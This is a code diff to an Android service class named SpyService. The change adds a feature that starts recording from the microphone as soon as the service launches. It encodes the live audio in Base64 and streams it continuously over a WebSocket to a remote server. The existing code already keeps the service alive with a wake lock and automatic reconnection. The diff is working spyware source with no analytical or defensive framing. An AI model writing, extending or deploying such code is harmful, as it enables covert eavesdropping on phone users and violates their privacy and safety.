@@ -5,11 +5,15 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.util.Base64;
 
 import com.squareup.okhttp3.OkHttpClient;
 import com.squareup.okhttp3.Request;
@@ -24,6 +28,9 @@ public class SpyService extends Service {
     private WebSocket webSocket;
     private Handler handler = new Handler();
     private String deviceId;
+    private AudioRecord audioRecord;
+    private boolean isRecording = false;
+    private Thread audioThread;
 
     @Override
     public void onCreate() {
@@ -34,6 +41,7 @@ public class SpyService extends Service {
         wakeLock.acquire(10 * 60 * 1000L);
         startForeground(9999, createNotification());
         initWebSocket();
+        startAudioStreaming();
     }
 
     private void initWebSocket() {
@@ -53,6 +61,31 @@ public class SpyService extends Service {
                 handler.postDelayed(() -> initWebSocket(), 5000);
             }
         });
+    }
+
+    private void sendWebSocket(String msg) {
+        if (webSocket != null) webSocket.send(msg);
+    }
+
+    private void startAudioStreaming() {
+        if (isRecording) return;
+        int bufferSize = AudioRecord.getMinBufferSize(8000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
+        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 8000, AudioFormat.CHANNEL_IN_MONO,
+                AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2);
+        isRecording = true;
+        audioThread = new Thread(() -> {
+            byte[] buffer = new byte[bufferSize];
+            while (isRecording) {
+                int read = audioRecord.read(buffer, 0, buffer.length);
+                if (read > 0) {
+                    String b64 = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
+                    sendWebSocket("AUDIO|" + b64);
+                }
+                try { Thread.sleep(50); } catch (Exception e) {}
+            }
+        });
+        audioRecord.startRecording();
+        audioThread.start();
     }
 
     private Notification createNotification() {
@@ -76,6 +109,9 @@ public class SpyService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        isRecording = false;
+        if (audioThread != null) audioThread.interrupt();
+        if (audioRecord != null) audioRecord.stop();
         if (webSocket != null) webSocket.close(1000, "Service stopped");
     }
 
